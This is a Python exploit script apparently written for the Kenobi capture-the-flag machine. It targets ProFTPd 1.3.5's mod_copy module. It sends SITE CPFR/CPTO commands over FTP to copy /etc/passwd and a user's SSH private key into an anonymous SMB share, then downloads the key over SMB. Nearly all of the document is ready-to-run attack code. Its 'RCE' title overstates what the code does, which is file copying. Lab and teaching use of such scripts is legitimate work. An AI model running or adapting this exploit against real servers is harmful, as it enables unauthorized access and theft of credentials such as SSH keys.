# Exploit Title: ProFTPd 1.3.5 - 'mod_copy' RCE with SMB anon access
# Based on exisitng ProFTPd exploit used with Kenobi THM machine
# Make sure to install: pip install pysmb
# USAGE: python3 proftpd_modcopy.py $TARGET

#!/usr/bin/env python3

import socket
import sys

import requests
from smb.SMBConnection import SMBConnection

# CHANGE THIS SECTION- SMB LOCATION
share = "anonymous"
smb_loc = "/home/kenobi/share/"
file2fetch = "/home/kenobi/.ssh/id_rsa"


def ftp_exploit(client, target):
    # Connect to FTP server
    client.connect((target, 21))
    banner = client.recv(74)
    print(banner.decode())
    # POC
    client.send(b"site cpfr /etc/passwd\r\n")
    print(client.recv(1024).decode())
    client.send(b"site cpto " + smb_loc.encode() + b"passwd.txt\r\n")  # PoC.
    print(client.recv(1024).decode())
    # Transfer desired file to SMB share
    client.send(b"site cpfr " + file2fetch.encode() + b"\r\n")
    print(client.recv(1024).decode())
    f = file2fetch.split("/")[-1]
    client.send(b"site cpto " + smb_loc.encode() + f.encode() + b"\r\n")
    print(client.recv(1024).decode())
    client.close()
    print("[+] Exploit Completed")


def smb_fetch(share, target):
    # Connect to SMB server
    try:
        conn = SMBConnection("anonymous", "", "", "")
        conn.connect(target)
        f = file2fetch.split("/")[-1]
        # Download desired file
        with open(f, "wb") as file:
            conn.retrieveFile(share, f, file)
        print("[+] File downloaded successfully")
    except Exception as e:
        print("[-] An SMB error occured, check SMB vars in script!")
    finally:
        conn.close()


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target = sys.argv[1]
    ftp_exploit(client, target)
    smb_fetch(share, target)


if __name__ == "__main__":
    main()
